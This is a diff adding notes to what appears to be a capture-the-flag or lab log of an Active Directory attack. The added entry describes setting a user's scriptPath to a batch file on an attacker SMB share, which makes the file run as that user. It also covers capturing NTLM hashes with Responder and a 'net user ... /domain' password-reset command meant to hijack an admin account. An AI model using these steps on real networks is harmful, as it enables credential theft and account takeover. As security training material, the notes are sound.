@@ -300,3 +300,33 @@ Something about the Garfield theme or the scriptPath mechanism is the key we're 
 - Responder running on tun0, listening for auth
 - Engine still running in parallel (iteration 1+)
 - kpasswd5 test: access denied (same ACL as SAMR)
+
+## 10:42 — BREAKTHROUGH: scriptPath trigger mechanism discovered
+
+### How it works
+The logon/scheduled task fires when **scriptPath is changed** (attribute change event, not a timer).
+- Set scriptPath → task fires within ~5 min → executes the bat as l.wilson
+- Toggle scriptPath (change to something else, change back) → fires again
+
+### Evidence
+- 10:42:49 — First hash captured after setting scriptPath to \\10.10.17.114\share\x.bat
+- 10:49:00 — Second hash captured after toggling scriptPath (x.bat → printerDetect.bat)
+- Both times, the `dir \\10.10.17.114\share` callback confirmed bat execution
+
+### Why it didn't work on previous instances
+On instances 2-5, we set scriptPath ONCE and waited. It probably fired once but we either:
+- Didn't have responder running yet
+- Had ntlmrelayx on port 445 swallowing the connection
+- Modified the bat AFTER it fired (too late)
+
+### Current status
+- Bat runs as l.wilson ✓
+- `net user l.wilson_adm P@ssw0rd2026! /domain` in the bat did NOT change the password
+- Likely because `net user /domain` uses NetUserSetInfo which checks different perms than ForceChangePassword
+- Need to use PowerShell `Set-ADAccountPassword` or SAMR-based approach instead
+
+### Next steps
+1. Fix the bat to use PowerShell or rpcclient-style password reset
+2. Toggle scriptPath to trigger
+3. Poll for l.wilson_adm password change
+4. If password changes → WinRM as l.wilson_adm → continue chain
